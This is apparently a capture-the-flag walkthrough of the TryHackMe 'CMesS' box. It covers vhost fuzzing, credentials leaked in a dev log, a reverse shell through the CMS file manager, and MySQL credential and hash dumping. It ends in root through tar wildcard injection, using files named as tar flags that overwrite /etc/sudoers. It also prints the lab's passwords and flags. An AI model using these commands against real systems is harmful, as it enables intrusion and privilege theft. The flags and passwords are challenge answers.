## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform subdomain fuzzing using wfuzz to discover hidden virtual hosts
- Read a development log page to extract credentials left by developers
- Log in to a CMS admin panel and exploit file manager access for a reverse shell
- Extract database credentials from a CMS configuration file
- Enumerate a MySQL database to find password hashes
- Find a plaintext backup password in `/opt`
- Escalate privileges using tar wildcard injection against a cron job

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Gobuster, wfuzz, and Netcat installed
- Add `Machine_IP cmess.thm` to `/etc/hosts` before starting
- Note: This box does not require brute forcing

---

## Task 1 — Flags

---

### Step 1 — /etc/hosts Configuration

**Approach:** Add the target to your hosts file so `cmess.thm` resolves correctly.

```
echo "Machine_IP cmess.thm" | sudo tee -a /etc/hosts
```

> **Note:** This machine uses virtual host routing — the CMS only responds correctly when the HTTP `Host` header is set to `cmess.thm`. Without this entry, the site may not render properly and subdomain enumeration will not work.

---

### Step 2 — Network Enumeration

**Approach:** Run an Nmap scan with service detection and default scripts to identify open ports.

```
kali@kali:~/CTFs/tryhackme/CMesS$ sudo nmap -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 20:16 CEST
Nmap scan report for Machine_IP
Host is up (0.033s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.59 seconds
```

> **Note:** Two ports are open — **SSH on 22** and **HTTP on 80**. Nmap's `http-generator` header immediately identifies **Gila CMS** as the web application. The `robots.txt` discloses three internal paths (`/src/`, `/themes/`, `/lib/`). Running `searchsploit Gila CMS` reveals known vulnerabilities including SQL injection and Local File Inclusion — worth noting for later.

---

### Step 3 — Web Directory Enumeration

**Approach:** Run Gobuster to map directories on the web server.

```
kali@kali:~/CTFs/tryhackme/CMesS$ gobuster dir -u Machine_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:            http://Machine_IP
===============================================================
/index (Status: 200)
/about (Status: 200)
/blog (Status: 200)
/login (Status: 200)
/admin (Status: 200)
/themes (Status: 301)
/assets (Status: 301)
/sites (Status: 301)
/log (Status: 301)
/lib (Status: 301)
/src (Status: 301)
/fm (Status: 200)
/tmp (Status: 301)
===============================================================
2020/10/11 20:28:45 Finished
===============================================================
```

> **Note:** The `/admin` and `/fm` (file manager) paths are especially interesting. The admin panel at `http://cmess.thm/admin` is the login interface for Gila CMS. The file manager at `/fm` could allow arbitrary file uploads once authenticated. Before attempting a login, the next step is to find credentials through subdomain enumeration.

---

### Step 4 — DNS Subdomain Fuzzing with wfuzz

**Approach:** Use wfuzz to fuzz the `Host` header for virtual host subdomains of `cmess.thm`. Filter out responses with the same line count as the default page (107 lines) to find unique subdomains.

```
kali@kali:~/CTFs/tryhackme/CMesS$ wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm/" -H "Host: FUZZ.cmess.thm" --hl 107

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4997

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000019:   200        30 L     104 W    934 Ch      "dev"
```

> **Note:** The subdomain **`dev.cmess.thm`** returns a different response (30 lines vs the default 107). Add it to `/etc/hosts`:
> ```
> echo "Machine_IP dev.cmess.thm" | sudo tee -a /etc/hosts
> ```
> Then browse to `http://dev.cmess.thm/` to read the development log.

---

### Step 5 — Reading the Development Log for Credentials

**Approach:** Navigate to `http://dev.cmess.thm/` to read the development changelog left by the team.

The development log contains:

```
Development Log
andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%
```

> **Note:** The support team left a **plaintext password** in a public-facing development log — a severe information disclosure vulnerability. The credentials are **`andre@cmess.thm:KPFTN_f2yxe%`**. Log in to `http://cmess.thm/admin` with these credentials. Once inside the CMS admin panel, use the file manager at `/fm` to upload a PHP reverse shell and trigger it to gain a shell as `www-data`.

---

### Step 6 — Reading the CMS Configuration File

**Approach:** After gaining a shell as `www-data`, read the Gila CMS configuration file to find database credentials.

```php
<?php

$GLOBALS['config'] = array (
  'db' =>
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
  'admin_email' => 'andre@cmess.thm',
  'rewrite' => true,
);
```

> **Note:** The configuration file `/var/www/html/config.php` (or similar path) contains the MySQL root password **`r0otus3rpassw0rd`** in plaintext. CMS configuration files always contain database credentials — reading them is a standard step after gaining web server access.

---

### Step 7 — MySQL Enumeration

**Approach:** Connect to MySQL using the credentials from the config file and enumerate the `gila` database to find user hashes.

```
www-data@cmess:/var/www$ mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| gila               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use gila;
Database changed

mysql> show tables;
+----------------+
| Tables_in_gila |
+----------------+
| option         |
| page           |
| post           |
| postcategory   |
| postmeta       |
| user           |
| usermeta       |
| userrole       |
| widget         |
+----------------+
9 rows in set (0.00 sec)

mysql> SELECT * FROM user;
+----+----------+-----------------+--------------------------------------------------------------+--------+
| id | username | email           | pass                                                         | active |
+----+----------+-----------------+--------------------------------------------------------------+--------+
|  1 | andre    | andre@cmess.thm | $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa |      1 |
+----+----------+-----------------+--------------------------------------------------------------+--------+
1 row in set (0.00 sec)
```

> **Note:** The user table contains `andre`'s bcrypt password hash. While this could be cracked offline, a faster path exists — a backup password file in `/opt`.

---

### Step 8 — Backup Password File and User Flag

**Approach:** Check `/opt` for any readable backup files.

```
www-data@cmess:/var/www$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
www-data@cmess:/var/www$ su -l andre
Password:
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```

> **Note:** `/opt/.password.bak` is a hidden file containing `andre`'s backup password in plaintext — **`UQfsdCB7aAP6`**. Always check `/opt` for backup and configuration files. Switching to `andre` with this password gives us the user flag.

</details>

---

### Step 9 — Privilege Escalation via tar Wildcard Injection in Crontab

**Approach:** Check `/etc/crontab` for scheduled tasks. A cron job runs `tar` as root on a directory that `andre` can write to. Use tar's `--checkpoint` flag injection (the same wildcard technique as Skynet) to execute a privilege escalation script as root.

Navigate to `andre`'s `backup` directory and create the exploit files:

```
andre@cmess:~/backup$ echo 'echo "andre ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh privesc.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
```

Wait for the cron job to fire, then:

```
andre@cmess:~/backup$ sudo su
root@cmess:/home/andre/backup# cd /root/
root@cmess:~# cat root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```

> **Note:** When `tar` runs with a wildcard (`*`) in the backup directory, filenames beginning with `--` are interpreted as `tar` command-line flags. The file named `--checkpoint=1` triggers a checkpoint after every file, and `--checkpoint-action=exec=sh privesc.sh` executes our script at each checkpoint. The `privesc.sh` script overwrites `/etc/sudoers` to grant `andre` passwordless sudo. Once the cron fires, `sudo su` gives immediate root access. This is the same tar wildcard injection technique used in the Skynet room.
